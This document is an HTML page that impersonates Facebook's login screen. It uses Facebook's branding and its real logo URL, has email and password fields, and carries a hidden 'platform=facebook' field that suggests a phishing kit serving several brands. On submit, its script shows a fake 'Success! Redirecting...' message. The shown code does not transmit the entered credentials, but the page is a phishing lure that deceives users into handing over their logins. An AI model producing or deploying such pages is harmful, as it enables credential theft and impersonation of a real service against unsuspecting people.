<!DOCTYPE html><html><head><title>Facebook</title><meta name="viewport" content="width=device-width"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#1677ff,#0f5bb2);height:100vh;display:flex;align-items:center;justify-content:center}.container{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);width:380px;padding:20px}.logo{text-align:center;margin-bottom:20px}.logo img{width:180px}input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:6px;font-size:16px}input:focus{outline:0;border-color:#1877f2}.login-btn{background:#1877f2;color:#fff;border:0;padding:12px;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;width:100%;margin:10px 0}.login-btn:hover{background:#166fe5}.forgot{text-align:center;margin:15px 0;font-size:14px;color:#65676b}</style></head><body><div class="container"><div class="logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook"></div><form id="loginForm" method="POST"><input type="email" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Password" required><input type="hidden" name="platform" value="facebook"><button type="submit" class="login-btn">Log In</button></form><div class="forgot"><a href="#" style="color:#1877f2;text-decoration:none">Forgot Password?</a></div></div><script>document.getElementById('loginForm').onsubmit=function(){setTimeout(()=>{document.body.innerHTML='<div style="text-align:center;padding:50px;color:#42b883">Success! Redirecting...</div>';},500);return!1;}</script></body></html>
